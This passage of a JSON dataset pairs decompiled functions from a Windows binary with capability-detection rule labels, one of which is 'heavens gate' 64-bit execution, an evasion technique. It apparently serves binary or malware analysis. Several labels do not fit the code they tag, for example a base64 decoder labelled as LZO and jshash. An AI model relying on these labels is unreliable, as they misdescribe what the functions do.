        "decompiled_code": "\nvoid fcn.0042ded6(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_EDI) {\n        if (*(unaff_EBP + -0x20) != unaff_EDI) {\n            puVar1 = *((*unaff_ESI >> 5) * 4 + 0x456fe0) + 4 + (*unaff_ESI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.0042ceaa(*unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00405fd5": {
        "rules": [
            "generate random numbers using the Delphi LCG/d1e3669b265a4cefae2dee380548f202"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fd5(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(((param_2 ^ *param_1) & 0xff) * 4 + 0x43d898) ^ *param_1 >> 8;\n    *param_1 = uVar1;\n    uVar1 = ((uVar1 & 0xff) + param_1[1]) * 0x8088405 + 1;\n    param_1[1] = uVar1;\n    param_1[2] = param_1[2] >> 8 ^ *(((uVar1 >> 0x18 ^ param_1[2]) & 0xff) * 4 + 0x43d898);\n    return;\n}\n",
        "token_count": 184
    },
    "0041c26c": {
        "rules": [
            "generate random numbers using the Delphi LCG/d1e3669b265a4cefae2dee380548f202"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c26c(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(((param_2 ^ *param_1) & 0xff) * 4 + 0x43bf68) ^ *param_1 >> 8;\n    *param_1 = uVar1;\n    uVar1 = ((uVar1 & 0xff) + param_1[1]) * 0x8088405 + 1;\n    param_1[1] = uVar1;\n    param_1[2] = param_1[2] >> 8 ^ *(((uVar1 >> 0x18 ^ param_1[2]) & 0xff) * 4 + 0x43bf68);\n    return;\n}\n",
        "token_count": 185
    },
    "00406717": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.00406717(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *unaff_EBX;\n    int32_t var_4h;\n    \n    iVar2 = fcn.004066a1(&var_4h);\n    iVar1 = var_4h;\n    if (iVar2 == 0) {\n        iVar2 = fcn.004066a1(&var_4h);\n    }\n    iVar3 = var_4h * 0x100;\n    if (iVar2 == 0) {\n        iVar2 = fcn.004066a1(&var_4h);\n    }\n    iVar4 = var_4h * 0x10000;\n    if ((iVar2 == 0) && (iVar2 = fcn.004066a1(&var_4h),  iVar2 == 0)) {\n        *unaff_EBX = var_4h * 0x1000000 + iVar1 + iVar3 + iVar4;\n        return;\n    }\n    *unaff_EBX = 0;\n    return;\n}\n",
        "token_count": 254
    },
    "00419fcc": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.00419fcc(void)\n\n{\n    ushort uVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    ushort *puVar3;\n    char cVar4;\n    int32_t iVar5;\n    ushort *extraout_EDX;\n    int32_t unaff_EBX;\n    uint *puVar6;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    *(unaff_EBX + 0x1af50) = in_EAX;\n    *(unaff_EBX + 0x1af48) = 0;\n    *(unaff_EBX + 0x1af44) = 0;\n    *(unaff_EBX + 0x1af4c) = 0;\n    if (*(unaff_EBX + 0xe7e) == 0) {\n        var_8h = unaff_EBX + 0x1e40;\n        iVar2 = 0;\n        cVar4 = '\\0';\n        puVar6 = 0x43bdc8;\n        do {\n            *var_8h = iVar2;\n            var_4h = 0;\n            if (0 < 1 << (*puVar6 & 0x1f)) {\n                do {\n                    *(unaff_EBX + 0x1b3d + iVar2) = cVar4;\n                    iVar2 = iVar2 + 1;\n                    var_4h = var_4h + 1;\n                } while (var_4h < 1 << (*puVar6 & 0x1f));\n            }\n            var_8h = var_8h + 1;\n            puVar6 = puVar6 + 1;\n            cVar4 = cVar4 + '\\x01';\n        } while (puVar6 < 0x43be38);\n        *(iVar2 + 0x1b3c + unaff_EBX) = cVar4;\n        var_8h = unaff_EBX + 0x1eb4;\n        iVar2 = 0;\n        iVar5 = 0;\n        puVar6 = 0x43be50;\n        do {\n            var_4h = 0;\n            *var_8h = iVar2;\n            if (0 < 1 << (*puVar6 & 0x1f)) {\n                do {\n                    *(unaff_EBX + 0x1c3d + iVar2) = iVar5;\n                    iVar2 = iVar2 + 1;\n                    var_4h = var_4h + 1;\n                } while (var_4h < 1 << (*puVar6 & 0x1f));\n            }\n            var_8h = var_8h + 1;\n            puVar6 = puVar6 + 1;\n            iVar5 = iVar5 + 1;\n        } while (puVar6 < 0x43be90);\n        iVar2 = iVar2 >> 7;\n        if (iVar5 < 0x1e) {\n            var_8h = unaff_EBX + 0x1eb4 + iVar5 * 4;\n            puVar6 = iVar5 * 4 + 0x43be50;\n            do {\n                var_4h = 0;\n                *var_8h = iVar2 << 7;\n                if (0 < 1 << (*puVar6 - 7U & 0x1f)) {\n                    do {\n                        *(unaff_EBX + 0x1d3d + iVar2) = iVar5;\n                        iVar2 = iVar2 + 1;\n                        var_4h = var_4h + 1;\n                    } while (var_4h < 1 << (*puVar6 - 7U & 0x1f));\n                }\n                var_8h = var_8h + 1;\n                puVar6 = puVar6 + 1;\n                iVar5 = iVar5 + 1;\n            } while (puVar6 < 0x43bec8);\n        }\n        iVar5 = 8;\n        puVar6 = unaff_EBX + 0xfe4;\n        for (iVar2 = iVar5; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        puVar3 = unaff_EBX + 0x9fe;\n        iVar2 = 0x90;\n        do {\n            *puVar3 = 8;\n            puVar3 = puVar3 + 2;\n            *(unaff_EBX + 0xff4) = *(unaff_EBX + 0xff4) + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        puVar3 = unaff_EBX + 0xc3e;\n        iVar2 = 0x70;\n        do {\n            *puVar3 = 9;\n            puVar3 = puVar3 + 2;\n            *(unaff_EBX + 0xff6) = *(unaff_EBX + 0xff6) + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        puVar3 = unaff_EBX + 0xdfe;\n        iVar2 = 0x18;\n        do {\n            *puVar3 = 7;\n            puVar3 = puVar3 + 2;\n            *(unaff_EBX + 0xff2) = *(unaff_EBX + 0xff2) + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        puVar3 = unaff_EBX + 0xe5e;\n        do {\n            *puVar3 = 8;\n            puVar3 = puVar3 + 2;\n            *(unaff_EBX + 0xff4) = *(unaff_EBX + 0xff4) + 1;\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n        fcn.0041a4b2(unaff_EBX, 0x11f);\n        iVar2 = 0;\n        puVar3 = unaff_EBX + 0xe7c;\n        do {\n            puVar3[1] = 5;\n            uVar1 = fcn.0041ae99(iVar2, 5);\n            *extraout_EDX = uVar1;\n            iVar2 = iVar2 + 1;\n            puVar3 = extraout_EDX + 2;\n        } while (iVar2 < 0x1e);\n        fcn.0041a1c7();\n    }\n    return;\n}\n",
        "token_count": 1472
    },
    "0041c411": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c411(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_EDX;\n    uint unaff_ESI;\n    ulong uVar4;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_4h;\n    \n    iVar2 = (**0x44643c)();\n    if (iVar2 != 0) {\n        uVar1 = var_38h & 1;\n        var_3ch = uVar1 != 0;\n        if ((var_38h & 2) != 0) {\n            var_3ch = var_3ch | 2;\n        }\n        if ((var_38h & 4) != 0) {\n            var_3ch = var_3ch | 4;\n        }\n        if ((var_38h & 0x10) != 0) {\n            var_3ch = var_3ch | 0x10;\n        }\n        if ((var_38h & 0x20) != 0) {\n            var_3ch = var_3ch | 0x20;\n        }\n        if ((var_38h & 0x10) == 0) {\n            var_3ch = var_3ch | 0x80000000;\n        }\n        else {\n            var_3ch = var_3ch | 0x40000000;\n        }\n        uVar3 = var_3ch | 0x1000000;\n        if (uVar1 == 0) {\n            uVar3 = var_3ch | 0x1800000;\n        }\n        var_3ch = uVar3;\n        uVar3 = (**0x44651c)();\n        if (0x28 < uVar3) {\n            (**0x44635c)();\n            (**0x446468)();\n            (**0x44635c)();\n            (**0x446468)();\n            if ((uVar1 == 0x54ad) && (var_4ch + 0x34U < uVar3)) {\n                (**0x44635c)();\n                (**0x446468)();\n                if ((var_5ch == 0x5a4d) || (((var_5ch == 0x454e || (var_5ch == 0x454c)) || (var_5ch == 0x4550)))) {\n                    var_3ch = var_3ch | 0x400000;\n                }\n            }\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = var_3ch;\n        }\n        if (arg_ch != NULL) {\n            *arg_ch = uVar3;\n        }\n        if (in_EDX != NULL) {\n            uVar4 = fcn.0041c388(var_2ch, var_28h);\n            *in_EDX = uVar4;\n            in_EDX[1] = uVar4 >> 0x20;\n            uVar4 = fcn.0041c388(var_24h, var_20h);\n            in_EDX[2] = uVar4;\n            in_EDX[3] = uVar4 >> 0x20;\n            uVar4 = fcn.0041c388(var_34h, var_30h);\n            in_EDX[4] = uVar4;\n            in_EDX[5] = uVar4 >> 0x20;\n        }\n        if (arg_10h != NULL) {\n            fcn.0041c3aa(var_24h);\n            *arg_10h = var_3ch & 0xffff | uVar1 << 0x10;\n        }\n    }\n    fcn.0041e0a1(unaff_ESI);\n    return;\n}\n",
        "token_count": 976
    },
    "0041c99e": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041c99e(int32_t param_1, int32_t param_2)\n\n{\n    int32_t unaff_EBX;\n    ulong uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    *(unaff_EBX + 0x7c) = 0;\n    *(unaff_EBX + 0x84) = param_2;\n    *(unaff_EBX + 0x80) = 0;\n    *(unaff_EBX + 0x78) = 0;\n    *(unaff_EBX + 0x90) = 0;\n    *(unaff_EBX + 0x74) = 0;\n    *(unaff_EBX + 0x88) = param_1;\n    *(unaff_EBX + 0x8c) = 0;\n    if ((param_2 != 0) && (param_1 != 0)) {\n        *(unaff_EBX + 0x4c) = 0x80000000;\n        *(unaff_EBX + 0x70) = param_1;\n        *(unaff_EBX + 0x6c) = 1;\n        (**0x446434)(&var_14h);\n        (**0x446450)(&var_14h, &var_24h);\n        uVar2 = var_24h;\n        uVar3 = var_20h;\n        fcn.0041c3aa(var_24h);\n        uVar1 = fcn.0041c388(var_24h, var_20h, uVar2, uVar3);\n        uVar3 = uVar1 >> 0x20;\n        uVar2 = uVar1;\n        *(unaff_EBX + 0x50) = uVar2;\n        *(unaff_EBX + 0x58) = uVar2;\n        *(unaff_EBX + 0x60) = uVar2;\n        *(unaff_EBX + 0x5c) = uVar3;\n        *(unaff_EBX + 100) = uVar3;\n        *(unaff_EBX + 0x68) = CONCAT22(var_1ch, var_18h);\n        *(unaff_EBX + 0x54) = uVar3;\n    }\n    fcn.0041e0a1(in_stack_ffffffd4);\n    return;\n}\n",
        "token_count": 611
    },
    "0041ca61": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041ca61(void)\n\n{\n    int32_t unaff_EBX;\n    ulong uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *arg_8h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    *(unaff_EBX + 0x7c) = 0;\n    *(unaff_EBX + 0x84) = 0;\n    *(unaff_EBX + 0x80) = 0;\n    *(unaff_EBX + 0x78) = 0;\n    *(unaff_EBX + 0x90) = 0;\n    *(unaff_EBX + 0x74) = 0;\n    *(unaff_EBX + 0x70) = 0;\n    *(unaff_EBX + 0x6c) = 0;\n    arg_8h = &var_14h;\n    *(unaff_EBX + 0x4c) = 0x41c00010;\n    (**0x446434)();\n    (**0x446450)(&var_14h, &var_24h);\n    uVar2 = var_24h;\n    uVar3 = var_20h;\n    fcn.0041c3aa(var_24h);\n    uVar1 = fcn.0041c388(var_24h, var_20h, uVar2, uVar3);\n    uVar3 = uVar1 >> 0x20;\n    uVar2 = uVar1;\n    *(unaff_EBX + 0x50) = uVar2;\n    *(unaff_EBX + 0x58) = uVar2;\n    *(unaff_EBX + 0x60) = uVar2;\n    *(unaff_EBX + 0x5c) = uVar3;\n    *(unaff_EBX + 100) = uVar3;\n    *(unaff_EBX + 0x68) = CONCAT22(var_1ch, var_18h);\n    *(unaff_EBX + 0x54) = uVar3;\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 542
    },
    "004066db": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066db(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *unaff_EDI;\n    int32_t var_4h;\n    \n    iVar2 = fcn.004066a1(&var_4h);\n    iVar1 = var_4h;\n    if ((iVar2 == 0) && (iVar2 = fcn.004066a1(&var_4h),  iVar2 == 0)) {\n        *unaff_EDI = var_4h * 0x100 + iVar1;\n        return;\n    }\n    *unaff_EDI = 0;\n    return;\n}\n",
        "token_count": 151
    },
    "004163a5": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.004163a5(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    int32_t in_EAX;\n    uint8_t *in_ECX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    iVar4 = 0;\n    puVar3 = in_ECX;\n    if (0 < arg_8h) {\n        do {\n            *puVar3 = *(*(in_EAX + iVar4) + 0x43c368) << 2 | *(*(in_EAX + 1 + iVar4) + 0x43c368) >> 4;\n            puVar3[1] = *(*(in_EAX + 2 + iVar4) + 0x43c368) >> 2 | *(*(in_EAX + 1 + iVar4) + 0x43c368) << 4;\n            pcVar1 = in_EAX + 2 + iVar4;\n            pcVar2 = in_EAX + 3 + iVar4;\n            iVar4 = iVar4 + 4;\n            puVar3[2] = *(*pcVar1 + 0x43c368) << 6 | *(*pcVar2 + 0x43c368);\n            puVar3 = puVar3 + 3;\n        } while (iVar4 < arg_8h);\n    }\n    if (*(in_EAX + -2 + iVar4) == '=') {\n        *(puVar3 + -1) = 0;\n        puVar3 = puVar3 + -2;\n    }\n    else if (*(in_EAX + -1 + iVar4) == '=') {\n        *puVar3 = 0;\n        puVar3 = puVar3 + -1;\n    }\n    *puVar3 = 0;\n    return in_ECX;\n}\n",
        "token_count": 418
    },
    "0041adb8": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041adb8(int32_t param_1)\n\n{\n    uint16_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    uVar2 = 0;\n    uVar4 = 0;\n    puVar1 = param_1 + 0x14;\n    iVar3 = 7;\n    do {\n        uVar4 = uVar4 + *puVar1;\n        puVar1 = puVar1 + 2;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puVar1 = param_1 + 0x30;\n    iVar3 = 0x79;\n    do {\n        uVar2 = uVar2 + *puVar1;\n        puVar1 = puVar1 + 2;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puVar1 = param_1 + 0x214;\n    iVar3 = 0x80;\n    do {\n        uVar4 = uVar4 + *puVar1;\n        puVar1 = puVar1 + 2;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    **(param_1 + 0x1af50) = uVar4 <= uVar2 >> 2;\n    return;\n}\n",
        "token_count": 312
    },
    "0041b17f": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.0041b17f(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t in_EDX;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    char var_2h;\n    uint var_1h;\n    char *pcVar3;\n    \n    var_8h = *(in_EDX + 0x6af94);\n    var_ch = *(in_EDX + 0x6af84);\n    iVar1 = var_ch + in_EDX;\n    pcVar6 = *(in_EDX + 0x6af80);\n    if (var_ch < 0x7efb) {\n        var_ch = 0;\n    }\n    else {\n        var_ch = var_ch - 0x7efa;\n    }\n    var_1h._0_1_ = pcVar6[iVar1 + 0x1af6f];\n    pcVar4 = iVar1 + 0x1b072;\n    var_2h = pcVar6[iVar1 + 0x1af70];\n    if (*(in_EDX + 0x6af9c) <= pcVar6) {\n        var_8h = var_8h >> 2;\n    }\n    do {\n        pcVar5 = in_EDX + 0x1af70 + arg_8h;\n        if ((((pcVar5[pcVar6] == var_2h) && (pcVar5[pcVar6 + -1] == var_1h)) && (*pcVar5 == *(iVar1 + 0x1af70))) &&\n           (pcVar5[1] == *(iVar1 + 0x1af71))) {\n            pcVar5 = pcVar5 + 2;\n            pcVar3 = iVar1 + 0x1af72;\n            while (((((pcVar2 = pcVar3 + 1,  *pcVar2 == pcVar5[1] && (pcVar2 = pcVar3 + 2,  *pcVar2 == pcVar5[2])) &&\n                     ((pcVar2 = pcVar3 + 3,  *pcVar2 == pcVar5[3] &&\n                      ((pcVar2 = pcVar3 + 4,  *pcVar2 == pcVar5[4] && (pcVar2 = pcVar3 + 5,  *pcVar2 == pcVar5[5]))))))\n                    && (pcVar2 = pcVar3 + 6,  *pcVar2 == pcVar5[6])) && (pcVar2 = pcVar3 + 7,  *pcVar2 == pcVar5[7]))) {\n                pcVar2 = pcVar3 + 8;\n                pcVar5 = pcVar5 + 8;\n                if ((*pcVar2 != *pcVar5) || (pcVar3 = pcVar2,  pcVar4 <= pcVar2)) break;\n            }\n            pcVar5 = pcVar2 + (0x102 - pcVar4);\n            if (pcVar6 < pcVar5) {\n                *(in_EDX + 0x6af88) = arg_8h;\n                if (*(in_EDX + 0x6afa0) <= pcVar5) {\n                    return pcVar5;\n                }\n                var_1h._0_1_ = pcVar2[iVar1 + 0x1af70 + (0x101 - pcVar4)];\n                var_2h = pcVar5[iVar1 + 0x1af70];\n                pcVar6 = pcVar5;\n            }\n        }\n        arg_8h = *(in_EDX + 0x2af70 + (arg_8h & 0x7fff) * 4);\n        if (arg_8h <= var_ch) {\n            return pcVar6;\n        }\n        var_8h = var_8h - 1;\n        if (var_8h == 0) {\n            return pcVar6;\n        }\n    } while( true );\n}\n",
        "token_count": 939
    },
    "0040cb3a": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h_78\n\nvoid fcn.0040cb3a(void)\n\n{\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint var_10h_26;\n    uint var_4h_77;\n    uint var_14h_26;\n    uint var_4h_76;\n    uint var_18h_26;\n    uint var_4h_75;\n    uint var_10h_25;\n    uint var_4h_74;\n    uint var_14h_25;\n    uint var_4h_73;\n    uint var_18h_25;\n    uint var_4h_72;\n    uint var_10h_24;\n    uint var_4h_71;\n    uint var_14h_24;\n    uint var_4h_70;\n    uint var_18h_24;\n    uint var_4h_69;\n    uint var_10h_23;\n    uint var_4h_68;\n    uint var_14h_23;\n    uint var_4h_67;\n    uint var_18h_23;\n    uint var_4h_66;\n    uint var_10h_22;\n    uint var_4h_65;\n    uint var_14h_22;\n    uint var_4h_64;\n    uint var_18h_22;\n    uint var_4h_63;\n    uint var_10h_21;\n    uint var_4h_62;\n    uint var_14h_21;\n    uint var_4h_61;\n    uint var_18h_21;\n    uint var_4h_60;\n    uint var_10h_20;\n    uint var_4h_59;\n    uint var_14h_20;\n    uint var_4h_58;\n    uint var_18h_20;\n    uint var_4h_57;\n    uint var_10h_19;\n    uint var_4h_56;\n    uint var_14h_19;\n    uint var_4h_55;\n    uint var_18h_19;\n    uint var_4h_54;\n    uint var_10h_18;\n    uint var_4h_53;\n    uint var_14h_18;\n    uint var_4h_52;\n    uint var_18h_18;\n    uint var_4h_51;\n    uint var_10h_17;\n    uint var_4h_50;\n    uint var_14h_17;\n    uint var_4h_49;\n    uint var_18h_17;\n    uint var_4h_48;\n    uint var_10h_16;\n    uint var_4h_47;\n    uint var_14h_16;\n    uint var_4h_46;\n    uint var_18h_16;\n    uint var_4h_45;\n    uint var_10h_15;\n    uint var_4h_44;\n    uint var_14h_15;\n    uint var_4h_43;\n    uint var_18h_15;\n    uint var_4h_42;\n    uint var_10h_14;\n    uint var_4h_41;\n    uint var_14h_14;\n    uint var_4h_40;\n    uint var_18h_14;\n    uint var_4h_39;\n    uint var_10h_13;\n    uint var_4h_38;\n    uint var_14h_13;\n    uint var_4h_37;\n    uint var_18h_13;\n    uint var_4h_36;\n    uint var_10h_12;\n    uint var_4h_35;\n    uint var_14h_12;\n    uint var_4h_34;\n    uint var_18h_12;\n    uint var_4h_33;\n    uint var_10h_11;\n    uint var_4h_32;\n    uint var_14h_11;\n    uint var_4h_31;\n    uint var_18h_11;\n    uint var_4h_30;\n    uint var_10h_10;\n    uint var_4h_29;\n    uint var_14h_10;\n    uint var_4h_28;\n    uint var_18h_10;\n    uint var_4h_27;\n    uint var_10h_9;\n    uint var_4h_26;\n    uint var_14h_9;\n    uint var_4h_25;\n    uint var_18h_9;\n    uint var_4h_24;\n    uint var_10h_8;\n    uint var_4h_23;\n    uint var_14h_8;\n    uint var_4h_22;\n    uint var_18h_8;\n    uint var_4h_21;\n    uint var_10h_7;\n    uint var_4h_20;\n    uint var_14h_7;\n    uint var_4h_19;\n    uint var_18h_7;\n    uint var_4h_18;\n    uint var_10h_6;\n    uint var_4h_17;\n    uint var_14h_6;\n    uint var_4h_16;\n    uint var_18h_6;\n    uint var_4h_15;\n    uint var_10h_5;\n    uint var_4h_14;\n    uint var_14h_5;\n    uint var_4h_13;\n    uint var_18h_5;\n    uint var_4h_12;\n    uint var_10h_4;\n    uint var_4h_11;\n    uint var_14h_4;\n    uint var_4h_10;\n    uint var_18h_4;\n    uint var_4h_9;\n    uint var_10h_3;\n    uint var_4h_8;\n    uint var_14h_3;\n    uint var_4h_7;\n    uint var_18h_3;\n    uint var_4h_6;\n    uint var_10h_2;\n    uint var_4h_5;\n    uint var_14h_2;\n    uint var_4h_4;\n    uint var_18h_2;\n    uint var_4h_3;\n    uint var_18h;\n    uint var_4h_2;\n    uint var_14h;\n    uint var_4h;\n    uint var_10h;\n    uint uVar1;\n    uint in_stack_fffff578;\n    uint in_stack_fffff57c;\n    uint in_stack_fffff580;\n    uint in_stack_fffff584;\n    uint in_stack_fffff588;\n    uint in_stack_fffff58c;\n    uint in_stack_fffff598;\n    uint in_stack_fffff59c;\n    uint in_stack_fffff5a0;\n    uint in_stack_fffff5a4;\n    uint in_stack_fffff5a8;\n    uint in_stack_fffff5ac;\n    uint32_t in_stack_fffff5b8;\n    uint in_stack_fffff5bc;\n    uint in_stack_fffff5c0;\n    uint in_stack_fffff5c4;\n    uint in_stack_fffff5e0;\n    uint in_stack_fffff5e4;\n    uint in_stack_fffff5e8;\n    uint in_stack_fffff5ec;\n    uint in_stack_fffff5f0;\n    uint in_stack_fffff5f4;\n    uint in_stack_fffff600;\n    uint in_stack_fffff604;\n    uint in_stack_fffff608;\n    uint in_stack_fffff60c;\n    uint in_stack_fffff610;\n    uint in_stack_fffff614;\n    uint32_t in_stack_fffff620;\n    uint in_stack_fffff624;\n    uint in_stack_fffff628;\n    uint in_stack_fffff62c;\n    uint in_stack_fffff648;\n    uint in_stack_fffff64c;\n    uint in_stack_fffff650;\n    uint in_stack_fffff654;\n    uint in_stack_fffff658;\n    uint in_stack_fffff65c;\n    uint in_stack_fffff668;\n    uint in_stack_fffff66c;\n    uint in_stack_fffff670;\n    uint in_stack_fffff674;\n    uint in_stack_fffff678;\n    uint in_stack_fffff67c;\n    uint in_stack_fffff688;\n    uint in_stack_fffff68c;\n    uint in_stack_fffff690;\n    uint in_stack_fffff694;\n    uint in_stack_fffff698;\n    uint in_stack_fffff69c;\n    uint in_stack_fffff6b0;\n    uint in_stack_fffff6b4;\n    uint in_stack_fffff6b8;\n    uint in_stack_fffff6bc;\n    uint in_stack_fffff6c0;\n    uint in_stack_fffff6c4;\n    uint in_stack_fffff6d0;\n    uint in_stack_fffff6d4;\n    uint in_stack_fffff6d8;\n    uint in_stack_fffff6dc;\n    uint in_stack_fffff6e0;\n    uint in_stack_fffff6e4;\n    uint in_stack_fffff6f0;\n    uint in_stack_fffff6f4;\n    uint in_stack_fffff6f8;\n    uint in_stack_fffff6fc;\n    uint in_stack_fffff700;\n    uint in_stack_fffff704;\n    uint in_stack_fffff718;\n    uint in_stack_fffff71c;\n    uint in_stack_fffff720;\n    uint in_stack_fffff724;\n    uint in_stack_fffff728;\n    uint in_stack_fffff72c;\n    uint in_stack_fffff738;\n    uint in_stack_fffff73c;\n    uint in_stack_fffff740;\n    uint in_stack_fffff744;\n    uint in_stack_fffff748;\n    uint in_stack_fffff74c;\n    uint in_stack_fffff758;\n    uint in_stack_fffff75c;\n    uint in_stack_fffff760;\n    uint in_stack_fffff764;\n    uint in_stack_fffff768;\n    uint in_stack_fffff76c;\n    uint in_stack_fffff780;\n    uint in_stack_fffff784;\n    uint in_stack_fffff788;\n    uint in_stack_fffff78c;\n    uint in_stack_fffff790;\n    uint in_stack_fffff794;\n    uint32_t in_stack_fffff7a0;\n    uint in_stack_fffff7a4;\n    uint in_stack_fffff7a8;\n    uint in_stack_fffff7ac;\n    uint32_t in_stack_fffff7c0;\n    uint in_stack_fffff7c4;\n    uint in_stack_fffff7c8;\n    uint in_stack_fffff7cc;\n    uint in_stack_fffff7e8;\n    uint in_stack_fffff7ec;\n    uint in_stack_fffff7f0;\n    uint in_stack_fffff7f4;\n    uint in_stack_fffff7f8;\n    uint in_stack_fffff7fc;\n    uint uVar2;\n    uint32_t in_stack_fffff808;\n    uint in_stack_fffff80c;\n    uint in_stack_fffff810;\n    uint in_stack_fffff814;\n    char *pcVar3;\n    uint32_t in_stack_fffff828;\n    uint in_stack_fffff82c;\n    uint in_stack_fffff830;\n    uint in_stack_fffff834;\n    uint in_stack_fffff850;\n    uint in_stack_fffff854;\n    uint in_stack_fffff858;\n    uint in_stack_fffff85c;\n    uint in_stack_fffff860;\n    uint in_stack_fffff864;\n    char *pcVar4;\n    uint32_t in_stack_fffff870;\n    uint in_stack_fffff874;\n    uint in_stack_fffff878;\n    uint in_stack_fffff87c;\n    uint in_stack_fffff890;\n    uint in_stack_fffff894;\n    uint in_stack_fffff898;\n    uint in_stack_fffff89c;\n    uint in_stack_fffff8a0;\n    uint in_stack_fffff8a4;\n    uint in_stack_fffff8b8;\n    uint in_stack_fffff8bc;\n    uint in_stack_fffff8c0;\n    uint in_stack_fffff8c4;\n    uint in_stack_fffff8c8;\n    uint in_stack_fffff8cc;\n    uint in_stack_fffff8d8;\n    uint in_stack_fffff8dc;\n    uint in_stack_fffff8e0;\n    uint in_stack_fffff8e4;\n    uint in_stack_fffff8e8;\n    uint in_stack_fffff8ec;\n    uint in_stack_fffff8f8;\n    uint in_stack_fffff8fc;\n    uint in_stack_fffff900;\n    uint in_stack_fffff904;\n    uint in_stack_fffff908;\n    uint in_stack_fffff90c;\n    uint in_stack_fffff920;\n    uint in_stack_fffff924;\n    uint in_stack_fffff928;\n    uint in_stack_fffff92c;\n    uint in_stack_fffff930;\n    uint in_stack_fffff934;\n    uint in_stack_fffff940;\n    uint in_stack_fffff944;\n    uint in_stack_fffff948;\n    uint in_stack_fffff94c;\n    uint in_stack_fffff950;\n    uint in_stack_fffff954;\n    uint in_stack_fffff960;\n    uint in_stack_fffff964;\n    uint in_stack_fffff968;\n    uint in_stack_fffff96c;\n    uint in_stack_fffff970;\n    uint in_stack_fffff974;\n    uint in_stack_fffff988;\n    uint in_stack_fffff98c;\n    uint in_stack_fffff990;\n    uint in_stack_fffff994;\n    uint in_stack_fffff998;\n    uint in_stack_fffff99c;\n    uint 